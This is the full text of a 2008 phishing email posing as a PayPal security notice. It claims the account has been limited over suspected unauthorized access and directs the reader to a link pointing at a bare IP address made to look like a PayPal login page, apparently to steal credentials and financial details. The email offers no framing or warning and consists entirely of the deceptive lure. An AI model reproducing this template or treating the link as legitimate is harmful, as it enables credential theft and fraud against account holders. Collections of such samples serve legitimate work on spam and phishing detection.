 Dear PayPal account holder, Due to recent attacks on multiple PayPal accounts and cardholders, PayPal Online Department has created and implemented a new security system designed to protect your account and provide an increased level of protection to your money and personal data. After multiple invalid login attempts on your account, we have strong reasons to believe that it might have been accessed by an unauthorized third party. This may be due to changes in your IP address or location. Protecting the security of your account and the PayPal network is our primary concern. Therefore, PayPal Online Department has limited your access to sensitive account features until your personal and financial information are confirmed. Once you have completed the steps required to remove the limitation, please allow us 24 hours to review the information submitted. In order to remove the limitation on your account, please follow the link below to one of our secure servers: http://222.133.5.11/ws/www/us/webscr.html?cmd=_login-run Case Id: PP - 37 - 4863 - 642 Notification reason: Suspicion of account theft and/or fraud attempt. Date: July 25, 2008 Note: If you received this message in your Spam/Bulk folder, that is because of the restrictions implemented by your isp. We apologize for any inconvenience this may cause. We appreciate your business and the opportunity to serve your needs. Copyright пїЅ 2008 PayPal. All rights reserved.
